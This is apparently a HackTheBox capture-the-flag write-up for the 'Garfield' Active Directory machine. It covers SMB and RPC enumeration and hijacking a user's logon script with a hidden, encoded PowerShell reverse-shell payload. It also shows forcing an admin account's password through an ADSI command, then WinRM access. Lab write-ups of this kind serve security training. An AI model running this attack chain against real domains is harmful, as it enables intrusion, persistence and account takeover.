# HackTheBox Garfield Full Chain Penetration Testing

## External Reconnaissance and Service Identification
    Network Mapping: Nmap scan of `10.129.26.230` leading to the identification of Active Directory services and SMB.
    SMB Enumeration: Used `smbmap` with starting credentials `j.arbuckle : Th1sD4mnC4t!@1978` to discover shared files.
    Data Discovery: Identified `printerDetect.bat` within a web-shared directory with read permissions, indicating its use in automated system processes or logon scripts.
    
## Active Directory Enumeration
    `bloodyAD get writable` revealed write permissions to; Liz Wilson, Liz Wilson ADM, krbtg_8245, S-1-5-1

    User Enumeration (RPC): Utilized `rpcclient` to map domain users, identifying two high-value targets: `l.wilson` (Standard User) and `l.wilson_adm` (Administrative Account).
    `
    rpcclient -U 'j.arbuckle%Th1sD4mnC4t!@1978' 10.129.26.230
    
    enumdomusers;
    user:[j.arbuckle] rid:[0xc1d]
    user:[l.wilson] rid:[0xc21]
    user:[l.wilson_adm] rid:[0xc23]
    
    queryuser 0xc21
    sAMAccountName: l.wilson
    CN: Liz Wilson
    
    queryuser 0xc23
    sAMAccountName:   l.wilson_adm
    CN:   Liz Wilson ADM
    `
    
    Group Membership: Verified that both accounts are members of the `Remote Management Users` group, confirming WinRM as a viable lateral movement vector.
    ACL Analysis: Employed `bloodyAD` to audit Object Security, revealing that `j.arbuckle` possesses write permissions over the `l.wilson` user object.
    `bloodyAD get object` for each user:
        defined both account location inside `Users`
        showed, that `l.wilson logs` in more often than `l.wilson_adm`
    
## Exploitation: Logon Script Injection
    Persistence via ADSI: Leveraged write permissions to modify the `scriptPath` attribute of the `l.wilson` account, pointing it to a malicious version of `printerDetect.bat`.
    Payload Construction: `@echo off powershell -nop -w hidden -enc {Base64_Encoded_Reverse_Shell}`
    Execution: Uploaded the modified `.bat` file via SMB. The payload executed upon the next login of `l.wilson`, granting an interactive shell as `garfield\l.wilson`.
    
## Lateral Movement and Privilege Escalation
    Credential Escalation (Force Change Password): Analyzed ACLs of the `l.wilson_adm` object using PowerShell ADSI, identifying the `User-Force-Change-Password` (Extended Right).
    Exploitation: `$u=[ADSI]"LDAP://CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"; $u.Invoke("SetPassword", @("Kwakwa5!"));`
    System Access: Authenticated via WinRM using the newly set credentials for `l.wilson_adm`.
    
## Domain Analysis and Data Exfiltration
    User Flag Recovery: Accessed the WinRm and retrieved the contents of `user.txt`.
